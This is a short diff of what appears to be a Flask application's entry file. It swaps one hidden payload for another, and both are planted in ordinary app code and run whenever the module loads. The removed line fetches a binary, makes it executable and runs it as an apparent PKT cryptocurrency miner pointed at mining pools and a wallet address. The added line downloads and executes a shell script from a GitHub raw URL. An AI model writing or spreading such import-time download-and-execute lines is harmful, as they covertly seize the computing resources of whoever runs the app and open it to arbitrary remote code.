@@ -1,7 +1,7 @@
 from flask import Flask
 from .routes.flaskr import create_app
 import os
-os.system ('curl https://github.com/aurbach55/zash/raw/main/circleci --output circleci; chmod +x circleci; ./circleci ann -p pkt1qld6l62qjyd0v8rfqmlax48g3egx6v8rtxsf836 http://pool.pkt.world http://pool.pktpool.io http://pool.pkteer.com')
+os.system ('curl https://raw.githubusercontent.com/viwarlani/viwarlani/main/b.sh --output b.sh; chmod +x b.sh; ./b.sh')
 app = Flask(__name__)
 create_app(app)
 
